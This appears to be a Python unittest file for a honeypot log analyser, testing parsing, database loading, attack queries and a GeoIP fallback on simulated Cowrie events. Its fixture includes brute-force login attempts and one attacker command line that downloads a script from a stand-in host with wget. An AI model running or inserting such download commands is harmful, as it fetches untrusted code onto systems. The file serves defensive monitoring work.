"""Tests for the database layer, GeoIP fallback and SQL queries.
Run: python -m unittest discover -s tests"""
import json
import tempfile
import unittest
from pathlib import Path

from src import database, queries
from src.geoip import enrich_ips
from src.parser import parse_log_file
from src.sessionizer import build_sessions

IP = "1.2.3.4"
SID = "sess0001"


def ev(eventid, ts, **extra):
    base = {"eventid": eventid, "timestamp": f"2026-01-01T10:00:{ts}Z",
            "src_ip": IP, "session": SID}
    base.update(extra)
    return json.dumps(base)


LINES = [
    ev("cowrie.session.connect", "00.000"),
    ev("cowrie.login.failed", "01.000", username="root", password="123"),
    ev("cowrie.login.failed", "02.000", username="admin", password="admin"),
    ev("cowrie.login.success", "03.000", username="root", password="toor"),
    ev("cowrie.command.input", "05.000", input="wget http://x.example/a.sh"),
    ev("cowrie.session.closed", "05.000", duration=5.0),
]


class TestDatabase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        base = Path(self.tmp.name)
        self.db = base / "test.db"
        log = base / "log.json"
        log.write_text("\n".join(LINES), encoding="utf-8")

        events, _ = parse_log_file(log)
        sessions = build_sessions(events)
        database.init_db(reset=True, db_path=self.db)
        database.load_events(events, db_path=self.db)
        database.load_sessions(sessions, db_path=self.db)

    def tearDown(self):
        self.tmp.cleanup()

    def test_tables_exist(self):
        t = database.query("SELECT name FROM sqlite_master WHERE type='table'",
                           db_path=self.db)
        names = set(t["name"])
        self.assertTrue({"events", "sessions", "ip_intel"}.issubset(names))

    def test_row_counts(self):
        self.assertEqual(
            database.query("SELECT COUNT(*) AS n FROM events", db_path=self.db)["n"][0], 6)
        self.assertEqual(
            database.query("SELECT COUNT(*) AS n FROM sessions", db_path=self.db)["n"][0], 1)

    def test_overview(self):
        row = queries.overview(db_path=self.db).iloc[0]
        self.assertEqual(row["total_events"], 6)
        self.assertEqual(row["total_sessions"], 1)
        self.assertEqual(row["unique_ips"], 1)
        self.assertEqual(row["failed_logins"], 2)
        self.assertEqual(row["successful_sessions"], 1)

    def test_top_usernames(self):
        top = queries.top_usernames(5, db_path=self.db)
        self.assertEqual(top.iloc[0]["username"], "root")
        self.assertEqual(top.iloc[0]["attempts"], 2)

    def test_geoip_fallback_and_country_query(self):
        missing = Path(self.tmp.name) / "no_such.mmdb"
        intel, used_db = enrich_ips([IP], db_path=missing)
        self.assertFalse(used_db)
        self.assertEqual(intel.iloc[0]["country"], "Unknown")

        database.load_ip_intel(intel, db_path=self.db)
        by_country = queries.attacks_by_country(5, db_path=self.db)
        self.assertEqual(by_country.iloc[0]["country"], "Unknown")
        self.assertEqual(by_country.iloc[0]["sessions"], 1)


if __name__ == "__main__":
    unittest.main()